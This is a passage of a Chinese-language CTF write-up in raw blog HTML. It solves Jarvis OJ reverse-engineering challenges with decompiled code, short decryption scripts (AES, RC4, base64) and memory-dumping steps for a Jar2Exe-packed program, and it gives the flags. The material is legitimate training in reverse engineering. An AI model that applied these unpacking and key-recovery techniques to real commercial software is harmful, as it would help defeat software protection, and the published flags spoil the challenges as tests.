[<span class="number">53</span>, <span class="number">222</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">67</span>, <span class="number">248</span>, <span class="number">226</span>, <span class="number">216</span>, <span class="number">17</span>, <span class="number">209</span>, <span class="number">32</span>, <span class="number">2</span>, <span class="number">181</span>, <span class="number">200</span>, <span class="number">171</span>, <span class="number">60</span>, <span class="number">108</span>]</span><br><span class="line">flag = raw_input(<span class="string">&#x27;Input your Key:&#x27;</span>).strip()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">17</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Wrong Key!!&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">flag = flag[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(flag[i]) + pwda[i] &amp; <span class="number">255</span> != lookup[(i + pwdb[i])]:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Wrong Key!!&#x27;</span></span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Congratulations!!&#x27;</span></span><br><span class="line"><span class="comment"># okay decompiling findkey.pyc</span></span><br></pre></td></tr></table></figure><p>则解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lookup = [</span><br><span class="line"> <span class="number">196</span>, <span class="number">153</span>, <span class="number">149</span>, <span class="number">206</span>, <span class="number">17</span>, <span class="number">221</span>, <span class="number">10</span>, <span class="number">217</span>, <span class="number">167</span>, <span class="number">18</span>, <span class="number">36</span>, <span class="number">135</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">111</span>, <span class="number">31</span>, <span class="number">92</span>, <span class="number">152</span>, <span class="number">21</span>, <span class="number">228</span>, <span class="number">105</span>, <span class="number">191</span>, <span class="number">173</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">245</span>, <span class="number">23</span>, <span class="number">144</span>, <span class="number">1</span>, <span class="number">246</span>, <span class="number">89</span>, <span class="number">178</span>, <span class="number">182</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">85</span>, <span class="number">48</span>, <span class="number">226</span>, <span class="number">165</span>, <span class="number">241</span>, <span class="number">166</span>, <span class="number">214</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">151</span>, <span class="number">3</span>, <span class="number">109</span>, <span class="number">169</span>, <span class="number">150</span>, <span class="number">224</span>, <span class="number">69</span>, <span class="number">156</span>, <span class="number">158</span>, <span class="number">57</span>, <span class="number">181</span>, <span class="number">29</span>, <span class="number">200</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">93</span>, <span class="number">65</span>, <span class="number">82</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">170</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">177</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">202</span>, <span class="number">107</span>, <span class="number">25</span>, <span class="number">73</span>, <span class="number">148</span>, <span class="number">98</span>, <span class="number">129</span>, <span class="number">231</span>, <span class="number">212</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">174</span>, <span class="number">171</span>, <span class="number">64</span>, <span class="number">180</span>, <span class="number">233</span>, <span class="number">74</span>, <span class="number">140</span>, <span class="number">242</span>, <span class="number">75</span>, <span class="number">104</span>, <span class="number">253</span>, <span class="number">44</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">86</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">55</span>, <span class="number">76</span>, <span class="number">35</span>, <span class="number">248</span>, <span class="number">96</span>, <span class="number">5</span>, <span class="number">56</span>, <span class="number">20</span>, <span class="number">161</span>, <span class="number">213</span>, <span class="number">238</span>, <span class="number">220</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">247</span>, <span class="number">8</span>, <span class="number">63</span>, <span class="number">249</span>, <span class="number">145</span>, <span class="number">243</span>, <span class="number">155</span>, <span class="number">222</span>, <span class="number">122</span>, <span class="number">32</span>, <span class="number">43</span>, <span class="number">186</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">216</span>, <span class="number">126</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">115</span>, <span class="number">138</span>, <span class="number">240</span>, <span class="number">147</span>, <span class="number">229</span>, <span class="number">204</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">141</span>, <span class="number">159</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">124</span>, <span class="number">254</span>, <span class="number">60</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">113</span>, <span class="number">79</span>, <span class="number">16</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">251</span>, <span class="number">40</span>, <span class="number">205</span>, <span class="number">137</span>, <span class="number">199</span>, <span class="number">83</span>, <span class="number">54</span>, <span class="number">188</span>, <span class="number">19</span>, <span class="number">184</span>, <span class="number">201</span>, <span class="number">110</span>, <span class="number">255</span>, <span class="number">26</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">132</span>, <span class="number">160</span>, <span class="number">168</span>, <span class="number">154</span>, <span class="number">185</span>, <span class="number">183</span>, <span class="number">244</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">123</span>, <span class="number">28</span>, <span class="number">59</span>, <span class="number">12</span>, <span class="number">210</span>, <span class="number">218</span>, <span class="number">47</span>, <span class="number">163</span>, <span class="number">215</span>, <span class="number">209</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">237</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">24</span>, <span class="number">234</span>, <span class="number">106</span>, <span class="number">143</span>, <span class="number">88</span>, <span class="number">9</span>, <span class="number">136</span>, <span class="number">95</span>, <span class="number">30</span>, <span class="number">193</span>, <span class="number">176</span>, <span class="number">225</span>, <span class="number">198</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">239</span>, <span class="number">134</span>, <span class="number">162</span>, <span class="number">192</span>, <span class="number">11</span>, <span class="number">70</span>, <span class="number">58</span>, <span class="number">187</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">236</span>, <span class="number">230</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">190</span>, <span class="number">208</span>, <span class="number">207</span>, <span class="number">7</span>, <span class="number">53</span>, <span class="number">219</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">114</span>, <span class="number">127</span>, <span class="number">125</span>, <span class="number">164</span>, <span class="number">179</span>, <span class="number">175</span>, <span class="number">112</span>, <span class="number">172</span>, <span class="number">250</span>, <span class="number">133</span>, <span class="number">130</span>, <span class="number">52</span>, <span class="number">189</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">34</span>, <span class="number">157</span>, <span class="number">120</span>, <span class="number">195</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">142</span>, <span class="number">139</span>]</span><br><span class="line">pwda = [</span><br><span class="line"> <span class="number">188</span>, <span class="number">155</span>, <span class="number">11</span>, <span class="number">58</span>, <span class="number">251</span>, <span class="number">208</span>, <span class="number">204</span>, <span class="number">202</span>, <span class="number">150</span>, <span class="number">120</span>, <span class="number">206</span>, <span class="number">237</span>, <span class="number">114</span>, <span class="number">92</span>, <span class="number">126</span>, <span class="number">6</span>, <span class="number">42</span>]</span><br><span class="line">pwdb = [<span class="number">53</span>, <span class="number">222</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">67</span>, <span class="number">248</span>, <span class="number">226</span>, <span class="number">216</span>, <span class="number">17</span>, <span class="number">209</span>, <span class="number">32</span>, <span class="number">2</span>, <span class="number">181</span>, <span class="number">200</span>, <span class="number">171</span>, <span class="number">60</span>, <span class="number">108</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([(lookup[(i + pwdb[i])] - pwda[i]) &amp; <span class="number">0xff</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>得flag: <code>PCTF&#123;PyC_Cr4ck3r&#125;</code></p><h2 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h2><p>.Net架构, 用dnspy反编译, 找到目标函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021100813.png" alt="Jarvis_OJ Re CrackMe"></p><p>则解密脚本为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="string">&quot;UENURntFYTV5X0RvX05ldF9DcjRjazNyfQ==&quot;</span>))</span><br></pre></td></tr></table></figure><p>得到flag: <code>PCTF&#123;Ea5y_Do_Net_Cr4ck3r&#125;</code></p><h2 id="CrackMe2"><a href="#CrackMe2" class="headerlink" title="CrackMe2"></a>CrackMe2</h2><p>.Net架构, 用dnspy反编译，找到加密函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021101142.png" alt="20201021101142"></p><p>设断点进行调试，追溯到函数如下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021101244.png" alt="20201021101244"></p><p>则函数逻辑如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入进行AES加密再进行base64编码，最终跟一串常量进行对比</span><br></pre></td></tr></table></figure><p>常量可由动态调试得到</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021101456.png" alt="20201021101456"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">b&quot;pctf2016pctf2016pctf2016pctf2016&quot;</span></span><br><span class="line">obj = AES.new(key,AES.MODE_ECB)</span><br><span class="line">cipher = <span class="string">b&quot;x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk=&quot;</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">plaintext = obj.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><p>运行得flag: <code>PCTF&#123;Dot_Net_UnPack3r_yoo&#125;</code></p><h2 id="Fibinacii"><a href="#Fibinacii" class="headerlink" title="Fibinacii"></a>Fibinacii</h2><p>本题为用jar2exe打包的程序。jar2exe将java和jvm打包生成exe，从而可以在没有JAVA的机器上直接运行，原理是通过JNI的接口，创建JVM来执行封装的java代码，与exe4j将jar导出生成临时文件不同，jar2exe是在内部执行的，因此无法直接找到临时文件来反编译</p><p>用<a href="https://github.com/katjahahn/JWScan">jwscan.jar</a>可以检查出程序用什么打包</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">CTF</span>\<span class="title">Games</span>\<span class="title">Exam</span>\<span class="title">Jarvis</span>\<span class="title">Re</span>\<span class="title">Fibonacci</span>&gt;<span class="title">java</span> -<span class="title">jar</span> <span class="title">JWScan</span>\<span class="title">jwscan.jar</span> <span class="title">Fibonacci.exe</span></span></span><br><span class="line"><span class="function"><span class="title">JWScan</span> 0.2.1 -- <span class="title">by</span> <span class="title">Katja</span> <span class="title">Hahn</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">scanning</span> <span class="title">file</span> ...</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">file</span> <span class="title">name</span>: <span class="title">Fibonacci.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Signatures</span> <span class="title">found</span>:</span></span><br><span class="line"><span class="function">        * <span class="title">Jar2Exe.com</span> <span class="title">signature</span></span></span><br><span class="line"><span class="function">        * <span class="title">PZIP</span> <span class="title">Magic</span> <span class="title">Number</span> (<span class="title">weak</span> <span class="title">indication</span> <span class="title">for</span> <span class="title">embedded</span> <span class="title">zip</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ZIP</span>/<span class="title">Jar</span> <span class="title">offsets</span>: 0<span class="title">x72e6d</span></span></span><br></pre></td></tr></table></figure><p>归根到底依旧是Java, 那么仍然是通过JVM来执行字节码的JAVA, 而Jae2Exe的打包有三种等级, <code>No Hiding, No Encryption</code>, <code>Hidden Archive</code> 和 <code>Hidden Archive + Encrypted Class Names</code> 本题应该属于后两种</p><p>根据夜影师傅的博客，找到<a href="http://blog.csdn.net/ravinow/article/details/51123839">提取经过Jar2Exe编译加密的源代码 教程1</a>, 原理是通过java提供的javaagent接口，使得每个方法执行之前都先执行dump函数, 缺点就是没有被执行的方法就不会被dump了。</p><p>下载<a href="https://github.com/slavemaster/e2j%E7%9A%84e2j">https://github.com/slavemaster/e2j的e2j</a>后在所在目录下设置<code>set JAVA_TOOL_OPTIONS=-javaagent:e2j-agent.jar</code>即可</p><p>然后运行需要的程序，显示如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\CTF\Games\Exam\Jarvis\Re\Fibonacci&gt;Fibonacci.exe</span><br><span class="line">Picked up JAVA_TOOL_OPTIONS: -javaagent:e2j-agent.jar</span><br><span class="line">来让我们玩一个数列游戏：</span><br><span class="line">a[0]=0,a[1]=1</span><br><span class="line">a[2]=1,a[3]=2</span><br><span class="line">a[4]=3,a[5]=5</span><br><span class="line">..............</span><br><span class="line">请计算a[100000000000000]：</span><br><span class="line"></span><br><span class="line">答案错误！！</span><br></pre></td></tr></table></figure><p>目录下便产生了e2j-xxx.dump.jar, 拖入<code>jd-gui</code>得到所在类，但类b中因为没有方法，所以没有被JavaAgent抓到，因此得到的类是不完整的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.phrack.ctf.Fibonacci;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heheda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String hello = hello(<span class="keyword">new</span> String(b.y), <span class="keyword">new</span> String(b.x));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;来让我们玩一个数列游戏：&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a[0]=0,a[1]=1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a[2]=1,a[3]=2&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a[4]=3,a[5]=5&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;..............&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请计算a[100000000000000]：&quot;</span>);</span><br><span class="line">        String nextLine = <span class="keyword">new</span> Scanner(System.in).nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;答案错误！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">hello</span><span class="params">(String aaa, String bbb)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            iS[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">256</span>; i2 = (<span class="keyword">short</span>) (i2 + <span class="number">1</span>)) &#123;</span><br><span class="line">            iK[i2] = (<span class="keyword">byte</span>) bbb.charAt(i2 % bbb.length());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i3 = <span class="number">0</span>; i3 &lt; <span class="number">255</span>; i3++) &#123;</span><br><span class="line">            j = ((iS[i3] + j) + iK[i3]) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> temp = iS[i3];</span><br><span class="line">            iS[i3] = iS[j];</span><br><span class="line">            iS[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span>[] iInputChar = aaa.toCharArray();</span><br><span class="line">        <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> x = <span class="number">0</span>; x &lt; iInputChar.length; x = (<span class="keyword">short</span>) (x + <span class="number">1</span>)) &#123;</span><br><span class="line">            i4 = (i4 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            j2 = (iS[i4] + j2) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> temp2 = iS[i4];</span><br><span class="line">            iS[i4] = iS[j2];</span><br><span class="line">            iS[j2] = temp2;</span><br><span class="line">            iOutputChar[x] = (<span class="keyword">char</span>) (iInputChar[x] ^ ((<span class="keyword">char</span>) iS[(iS[i4] + (iS[j2] % <span class="number">256</span>)) % <span class="number">256</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后根据<a href="http://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html">http://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html</a>知道java代码被存放在RCDATA数据中， 因此只要找到RCDATA的数据位置，在程序运行过程中设置访问断点，当程序解密时找到解密后的代码位置即可得到相应的java代码</p><p>通过CFF_Explorer查到RCDATA的HEX数据</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021161811.png" alt="20201021161811"></p><p>通过x64dbg直接搜索对于的特征值，于<code>0x477398</code>找到</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021162236.png" alt="20201021162236"></p><p>设置内存访问断点，运行到解密循环</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021162642.png" alt="20201021162642"></p><p>根据代码逻辑大致可猜测R10指向的内存是JAVA的字节码，而R11就是范围了</p><p>使程序解密完成，即运行到<code>0x000000000041E713</code>, 使用scylla插件Dump内存， 保存为<code>1.jar</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021163833.png" alt="20201021163833"></p><p>使用binwalk进行分离文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Desktop binwalk -e 1.jar</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">544           0x220           Zip archive data, at least v2.0 to extract, compressed size: 66, uncompressed size: 73, name: b5f78a55</span><br><span class="line">668           0x29C           Zip archive data, at least v2.0 to extract, compressed size: 193, uncompressed size: 386, name: 98065b2b</span><br><span class="line">915           0x393           Zip archive data, at least v2.0 to extract, compressed size: 563, uncompressed size: 791, name: c7dce9e9</span><br><span class="line">1532          0x5FC           Zip archive data, at least v2.0 to extract, compressed size: 1389, uncompressed size: 2243, name: 1ab0208d</span><br></pre></td></tr></table></figure><p>其中有两个文件为标准的class文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Desktop file _1.jar.extracted/*</span><br><span class="line">_1.jar.extracted/1ab0208d: compiled Java class data, version 51.0 (Java 1.7)</span><br><span class="line">_1.jar.extracted/220.zip:  Java archive data (JAR)</span><br><span class="line">_1.jar.extracted/98065b2b: XML 1.0 document, ASCII text, with CRLF line terminators</span><br><span class="line">_1.jar.extracted/b5f78a55: ASCII text, with CRLF line terminators</span><br><span class="line">_1.jar.extracted/c7dce9e9: compiled Java class data, version 51.0 (Java 1.7)</span><br></pre></td></tr></table></figure><p>将这俩修改后缀名为<code>*.class</code>拖进jd-gui进行查看，其中<code>c7dce9e9.class</code>可以得到b类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.phrack.ctf.Fibonacci;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span>[] x = &#123;<span class="string">&#x27;&#125;&#x27;</span>, <span class="number">16</span>, <span class="number">253</span>, <span class="number">201</span>, <span class="number">11</span>, <span class="number">22</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">205</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span>[] y = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="number">150</span>, <span class="number">174</span>, <span class="string">&#x27;D&#x27;</span>, <span class="number">180</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="number">214</span>, <span class="number">189</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="number">189</span>, <span class="number">217</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">199</span>, <span class="number">128</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">220</span>, <span class="number">222</span>, <span class="number">234</span>, <span class="number">11</span>, <span class="number">175</span>, <span class="number">228</span>, <span class="number">129</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么完整代码就有了，这题跟斐波那契数列一点关系都没有，cv工程师上线，写个java代码编译运行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Fibonacci fibonacci = <span class="keyword">new</span> Fibonacci();</span><br><span class="line">        System.out.println(fibonacci.heheda());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">heheda</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String bb = <span class="keyword">new</span> String(b.x);</span><br><span class="line">        String cb = <span class="keyword">new</span> String(b.y);</span><br><span class="line">        String m = hello(cb, bb);</span><br><span class="line">        <span class="keyword">return</span> m;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">hello</span><span class="params">(String aaa, String bbb)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            iS[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i = (<span class="keyword">short</span>)(i + <span class="number">1</span>)) &#123;</span><br><span class="line">            iK[i] = ((<span class="keyword">byte</span>)bbb.charAt(i % bbb.length()));</span><br><span class="line">        &#125;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            j = (j + iS[i] + iK[i]) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> temp = iS[i];</span><br><span class="line">            iS[i] = iS[j];</span><br><span class="line">            iS[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span>[] iInputChar = aaa.toCharArray();</span><br><span class="line">        <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> x = <span class="number">0</span>; x &lt; iInputChar.length; x = (<span class="keyword">short</span>)(x + <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            j = (j + iS[i]) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> temp = iS[i];</span><br><span class="line">            iS[i] = iS[j];</span><br><span class="line">            iS[j] = temp;</span><br><span class="line">            <span class="keyword">int</span> t = (iS[i] + iS[j] % <span class="number">256</span>) % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">int</span> iY = iS[t];</span><br><span class="line">            <span class="keyword">char</span> iCY = (<span class="keyword">char</span>)iY;</span><br><span class="line">            iOutputChar[x] = ((<span class="keyword">char</span>)(iInputChar[x] ^ iCY));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span>[] x = &#123;<span class="string">&#x27;&#125;&#x27;</span>, <span class="number">16</span>, <span class="number">253</span>, <span class="number">201</span>, <span class="number">11</span>, <span class="number">22</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">205</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span>[] y = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="number">150</span>, <span class="number">174</span>, <span class="string">&#x27;D&#x27;</span>, <span class="number">180</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="number">214</span>, <span class="number">189</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="number">189</span>, <span class="number">217</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">199</span>, <span class="number">128</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">220</span>, <span class="number">222</span>, <span class="number">234</span>, <span class="number">11</span>, <span class="number">175</span>, <span class="number">228</span>, <span class="number">129</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得flag: <code>PCTF&#123;1ts_not_5c2ipt_Chall3nge&#125;</code></p><p>本题参考:</p><ol><li><p><a href="https://blog.csdn.net/qq_33438733/article/details/79995702">171130 逆向-JarvisOJ（Fibonacci）</a></p></li><li><p><a href="http://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html">Unpacking Jar2Exe 2.1: Extracting The Jar File At All 3 Protection Levels</a></p></li></ol><h2 id="软件密码破解-1"><a href="#软件密码破解-1" class="headerlink" title="软件密码破解-1"></a>软件密码破解-1</h2><p>程序打开来7千多个函数，找不到入口，大致看了一下，发现有个地方很可疑, 这里由于动态调试过，因此基址会有出入（起始地址0x00B01000）</p><p><img 